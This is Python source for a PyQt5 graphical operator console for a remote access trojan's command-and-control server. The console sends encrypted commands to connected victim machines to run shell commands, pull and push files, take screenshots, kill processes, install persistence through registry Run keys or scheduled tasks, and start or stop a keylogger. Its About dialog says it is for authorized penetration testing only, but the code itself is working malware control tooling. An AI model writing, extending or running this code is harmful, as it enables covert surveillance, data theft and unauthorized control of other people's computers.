import sys
import socket
import threading
import json
from datetime import datetime
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QTextEdit, QListWidget, QPushButton, QLabel, QTabWidget, 
                            QLineEdit, QSplitter, QMessageBox, QFileDialog, QGroupBox,
                            QInputDialog, QComboBox)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
from PyQt5.QtGui import QTextCursor
from c2_server import RATServer, Security  # Import your existing server logic

class ServerSignals(QObject):
    new_client = pyqtSignal(str)
    client_disconnected = pyqtSignal(str)
    log_message = pyqtSignal(str)
    command_output = pyqtSignal(str, str)

class ThreadedServer(QThread):
    def __init__(self, server):
        super().__init__()
        self.server = server
        self.signals = ServerSignals()
        
        # Redirect server logging to our signals
        self.server.log_message = lambda msg: self.signals.log_message.emit(msg)
        
        # Modify the server's client handling to use our signals
        original_handle = self.server.handle_client
        def wrapped_handle(client_sock, addr):
            addr_str = f"{addr[0]}:{addr[1]}"
            original_handle(client_sock, addr)
            self.signals.new_client.emit(addr_str)
        self.server.handle_client = wrapped_handle

    def run(self):
        self.server.start_server()

class C2GUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.server = RATServer()
        self.init_ui()
        self.setup_server()
        self.current_client = None

    def init_ui(self):
        self.setWindowTitle("Advanced C2 Server - GUI")
        self.setGeometry(100, 100, 1200, 800)
        
        # Main Widget and Layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout(main_widget)
        
        # Left Panel (Client List and Logs)
        left_panel = QVBoxLayout()
        
        # Client List Group
        client_group = QGroupBox("Connected Clients")
        client_layout = QVBoxLayout()
        self.client_list = QListWidget()
        self.client_list.itemClicked.connect(self.select_client)
        self.refresh_btn = QPushButton("Refresh Clients")
        self.refresh_btn.clicked.connect(self.refresh_clients)
        client_layout.addWidget(self.client_list)
        client_layout.addWidget(self.refresh_btn)
        client_group.setLayout(client_layout)
        left_panel.addWidget(client_group)
        
        # Log Group
        log_group = QGroupBox("Server Logs")
        log_layout = QVBoxLayout()
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        log_layout.addWidget(self.log_display)
        log_group.setLayout(log_layout)
        left_panel.addWidget(log_group)
        
        # Right Panel (Tabs)
        self.tabs = QTabWidget()
        
        # Command Tab
        self.setup_command_tab()
        
        # File Transfer Tab
        self.setup_file_transfer_tab()
        
        # System Tab
        self.setup_system_tab()
        
        # Persistence Tab
        self.setup_persistence_tab()
        
        # Layout Organization
        splitter = QSplitter(Qt.Horizontal)
        left_widget = QWidget()
        left_widget.setLayout(left_panel)
        splitter.addWidget(left_widget)
        splitter.addWidget(self.tabs)
        splitter.setSizes([300, 900])
        main_layout.addWidget(splitter)
        
        # Menu Bar
        self.setup_menu()

    def setup_command_tab(self):
        command_tab = QWidget()
        layout = QVBoxLayout()
        
        # Command Output
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        
        # Command Input
        command_group = QGroupBox("Command Execution")
        command_inner = QVBoxLayout()
        self.command_input = QLineEdit()
        self.command_input.returnPressed.connect(self.execute_command)
        send_btn = QPushButton("Execute")
        send_btn.clicked.connect(self.execute_command)
        
        command_inner.addWidget(QLabel("Enter Command:"))
        command_inner.addWidget(self.command_input)
        command_inner.addWidget(send_btn)
        command_group.setLayout(command_inner)
        
        layout.addWidget(QLabel("Command Output:"))
        layout.addWidget(self.command_output)
        layout.addWidget(command_group)
        command_tab.setLayout(layout)
        self.tabs.addTab(command_tab, "Command")

    def setup_file_transfer_tab(self):
        file_tab = QWidget()
        layout = QVBoxLayout()
        
        # Download Group
        download_group = QGroupBox("Download File")
        download_layout = QVBoxLayout()
        self.remote_path = QLineEdit()
        self.local_path = QLineEdit()
        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self.browse_local_path)
        download_btn = QPushButton("Download")
        download_btn.clicked.connect(self.download_file)
        
        download_layout.addWidget(QLabel("Remote Path:"))
        download_layout.addWidget(self.remote_path)
        download_layout.addWidget(QLabel("Local Path:"))
        download_layout.addWidget(self.local_path)
        download_layout.addWidget(browse_btn)
        download_layout.addWidget(download_btn)
        download_group.setLayout(download_layout)
        
        # Upload Group
        upload_group = QGroupBox("Upload File")
        upload_layout = QVBoxLayout()
        self.upload_local = QLineEdit()
        self.upload_remote = QLineEdit()
        upload_browse = QPushButton("Browse...")
        upload_browse.clicked.connect(self.browse_upload_file)
        upload_btn = QPushButton("Upload")
        upload_btn.clicked.connect(self.upload_file)
        
        upload_layout.addWidget(QLabel("Local File:"))
        upload_layout.addWidget(self.upload_local)
        upload_layout.addWidget(upload_browse)
        upload_layout.addWidget(QLabel("Remote Path:"))
        upload_layout.addWidget(self.upload_remote)
        upload_layout.addWidget(upload_btn)
        upload_group.setLayout(upload_layout)
        
        layout.addWidget(download_group)
        layout.addWidget(upload_group)
        file_tab.setLayout(layout)
        self.tabs.addTab(file_tab, "File Transfer")

    def setup_system_tab(self):
        system_tab = QWidget()
        layout = QVBoxLayout()
        
        # System Info
        sysinfo_btn = QPushButton("Get System Info")
        sysinfo_btn.clicked.connect(lambda: self.send_system_command("systeminfo"))
        
        # Process List
        process_btn = QPushButton("List Processes")
        process_btn.clicked.connect(lambda: self.send_system_command("tasklist"))
        
        # Kill Process
        kill_group = QGroupBox("Kill Process")
        kill_layout = QVBoxLayout()
        self.pid_input = QLineEdit()
        kill_pid_btn = QPushButton("Kill by PID")
        kill_pid_btn.clicked.connect(self.kill_process)
        kill_layout.addWidget(QLabel("Process ID:"))
        kill_layout.addWidget(self.pid_input)
        kill_layout.addWidget(kill_pid_btn)
        kill_group.setLayout(kill_layout)
        
        # Screenshot
        screenshot_btn = QPushButton("Take Screenshot")
        screenshot_btn.clicked.connect(self.take_screenshot)
        
        layout.addWidget(sysinfo_btn)
        layout.addWidget(process_btn)
        layout.addWidget(kill_group)
        layout.addWidget(screenshot_btn)
        system_tab.setLayout(layout)
        self.tabs.addTab(system_tab, "System")

    def setup_persistence_tab(self):
        persist_tab = QWidget()
        layout = QVBoxLayout()
        
        # Method Selection
        method_group = QGroupBox("Persistence Method")
        method_layout = QVBoxLayout()
        self.method_combo = QComboBox()
        self.method_combo.addItems(["Registry Run Key", "Scheduled Task"])
        
        # Agent Path
        self.agent_path = QLineEdit()
        self.agent_path.setPlaceholderText("Path to agent on target system")
        
        # Execute
        persist_btn = QPushButton("Establish Persistence")
        persist_btn.clicked.connect(self.setup_persistence)
        
        method_layout.addWidget(QLabel("Method:"))
        method_layout.addWidget(self.method_combo)
        method_layout.addWidget(QLabel("Agent Path:"))
        method_layout.addWidget(self.agent_path)
        method_layout.addWidget(persist_btn)
        method_group.setLayout(method_layout)
        
        layout.addWidget(method_group)
        persist_tab.setLayout(layout)
        self.tabs.addTab(persist_tab, "Persistence")

    def setup_menu(self):
        menubar = self.menuBar()
        
        # File Menu
        file_menu = menubar.addMenu('File')
        exit_action = file_menu.addAction('Exit')
        exit_action.triggered.connect(self.close)
        
        # Tools Menu
        tools_menu = menubar.addMenu('Tools')
        keylogger_action = tools_menu.addAction('Keylogger Control')
        keylogger_action.triggered.connect(self.keylogger_control)
        
        # Help Menu
        help_menu = menubar.addMenu('Help')
        about_action = help_menu.addAction('About')
        about_action.triggered.connect(self.show_about)

    def setup_server(self):
        self.server_thread = ThreadedServer(self.server)
        self.server_thread.signals.new_client.connect(self.add_client)
        self.server_thread.signals.client_disconnected.connect(self.remove_client)
        self.server_thread.signals.log_message.connect(self.log_message)
        self.server_thread.signals.command_output.connect(self.display_output)
        self.server_thread.start()
        # Initialize with existing clients
        self.refresh_clients()

    def add_client(self, client_addr):
        """Handle new client connection signal"""
        addr_str = self.format_address(client_addr)
        if not any(self.client_list.item(i).text() == addr_str for i in range(self.client_list.count())):
            self.client_list.addItem(addr_str)
            self.log_message(f"New client connected: {addr_str}")

    def remove_client(self, client_addr):
        """Handle client disconnection signal"""
        addr_str = self.format_address(client_addr)
        items = self.client_list.findItems(addr_str, Qt.MatchExactly)
        for item in items:
            self.client_list.takeItem(self.client_list.row(item))
        self.log_message(f"Client disconnected: {addr_str}")

    def refresh_clients(self):
        """Manual refresh of client list"""
        self.client_list.clear()
        for addr in self.server.clients:
            addr_str = self.format_address(addr)
            self.client_list.addItem(addr_str)
        self.log_message("Client list refreshed")

    def format_address(self, addr):
        """Convert address to consistent string format"""
        if isinstance(addr, tuple):
            return f"{addr[0]}:{addr[1]}"
        elif isinstance(addr, str) and ':' not in addr:
            return f"{addr}:0"  # Default port if missing
        return addr  # Already formatted

    def select_client(self, item):
        """Handle client selection from list"""
        self.current_client = item.text()
        self.log_message(f"Selected client: {self.current_client}")
        # Update the server's current client reference
        if self.current_client in self.server.clients:
            self.server.current_client = self.server.clients[self.current_client]

    def log_message(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_display.append(f"[{timestamp}] {message}")
        self.log_display.moveCursor(QTextCursor.End)

    def display_output(self, client, output):
        if client == self.current_client:
            self.command_output.append(f"{client} > {output}")
            self.command_output.moveCursor(QTextCursor.End)

    def execute_command(self):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        cmd = self.command_input.text()
        if not cmd:
            return
            
        try:
            client_socket = self.server.clients[self.current_client]
            command = json.dumps({"type": "cmd", "command": cmd})
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            self.log_message(f"Command sent to {self.current_client}: {cmd}")
            self.command_input.clear()
        except Exception as e:
            self.log_message(f"Error: {str(e)}")

    def send_system_command(self, cmd):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        try:
            client_socket = self.server.clients[self.current_client]
            command = json.dumps({"type": "cmd", "command": cmd})
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            self.log_message(f"System command sent: {cmd}")
        except Exception as e:
            self.log_message(f"Error: {str(e)}")

    def browse_local_path(self):
        path = QFileDialog.getExistingDirectory(self, "Select Download Directory")
        if path:
            self.local_path.setText(path)

    def browse_upload_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if path:
            self.upload_local.setText(path)

    def download_file(self):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        remote = self.remote_path.text()
        local = self.local_path.text()
        
        if not remote or not local:
            QMessageBox.warning(self, "Warning", "Both paths must be specified!")
            return
            
        try:
            client_socket = self.server.clients[self.current_client]
            command = json.dumps({"type": "download", "file_path": remote})
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            self.log_message(f"Download request sent for: {remote}")
        except Exception as e:
            self.log_message(f"Error: {str(e)}")

    def upload_file(self):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        local = self.upload_local.text()
        remote = self.upload_remote.text()
        
        if not local or not remote:
            QMessageBox.warning(self, "Warning", "Both paths must be specified!")
            return
            
        try:
            with open(local, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
                
            client_socket = self.server.clients[self.current_client]
            command = json.dumps({
                "type": "upload", 
                "file_name": remote, 
                "content": content
            })
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            self.log_message(f"Upload request sent: {local} -> {remote}")
        except Exception as e:
            self.log_message(f"Error: {str(e)}")

    def take_screenshot(self):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        try:
            client_socket = self.server.clients[self.current_client]
            command = json.dumps({"type": "screenshot"})
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            self.log_message("Screenshot request sent")
        except Exception as e:
            self.log_message(f"Error: {str(e)}")

    def kill_process(self):
        pid = self.pid_input.text()
        if not pid:
            QMessageBox.warning(self, "Warning", "Enter a process ID!")
            return
            
        self.send_system_command(f"taskkill /PID {pid} /F")

    def setup_persistence(self):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        method = self.method_combo.currentText()
        path = self.agent_path.text()
        
        if not path:
            QMessageBox.warning(self, "Warning", "Agent path required!")
            return
            
        method_map = {
            "Registry Run Key": "registry",
            "Scheduled Task": "scheduled_task"
        }
        
        try:
            client_socket = self.server.clients[self.current_client]
            command = json.dumps({
                "type": "persist",
                "method": method_map[method],
                "agent_path": path
            })
            encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            client_socket.send(encrypted.encode('utf-8'))
            self.log_message(f"Persistence setup requested ({method})")
        except Exception as e:
            self.log_message(f"Error: {str(e)}")

    def keylogger_control(self):
        if not self.current_client:
            QMessageBox.warning(self, "Warning", "No client selected!")
            return
            
        action, ok = QInputDialog.getItem(
            self, "Keylogger Control", "Action:", ["Start", "Stop"], 0, False)
        
        if ok and action:
            try:
                client_socket = self.server.clients[self.current_client]
                cmd_type = "keylogger_start" if action == "Start" else "keylogger_stop"
                command = json.dumps({"type": cmd_type})
                encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
                client_socket.send(encrypted.encode('utf-8'))
                self.log_message(f"Keylogger {action.lower()} command sent")
            except Exception as e:
                self.log_message(f"Error: {str(e)}")

    def show_about(self):
        QMessageBox.about(self, "About C2 Server", 
                         "Advanced C2 Framework\n\n"
                         "For educational and authorized penetration testing only.\n"
                         "Unauthorized use is strictly prohibited.")

    def closeEvent(self, event):
        self.server.stop_server()
        self.server_thread.quit()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = C2GUI()
    window.show()
    sys.exit(app.exec_())